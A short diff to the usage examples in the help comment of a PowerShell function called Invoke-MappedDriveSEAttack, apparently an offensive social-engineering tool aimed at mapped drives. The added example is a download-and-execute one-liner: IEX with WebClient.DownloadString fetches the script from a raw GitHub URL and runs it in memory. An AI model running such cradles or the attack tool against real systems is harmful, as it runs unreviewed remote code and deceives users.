@@ -51,6 +51,8 @@ Function Invoke-MappedDriveSEAttack
             Invoke-MappedDriveSEAttack -drive R -verify $false
 	
             Invoke-MappedDriveSEAttack -drive T -retries = 3 | Out-File C:\users\public\libraries\tmp.library-ms
+            
+            IEX (New-Object net.webclient).downloadstring('https://raw.githubusercontent.com/watson0x90/PowerShell-Scripts/master/Invoke-MappedDriveSEAttack.ps1'); Invoke-MappedDriveSEAttack -Drive D -verify $false;
     #>
 
     $ErrorActionPreference = 'SilentlyContinue'
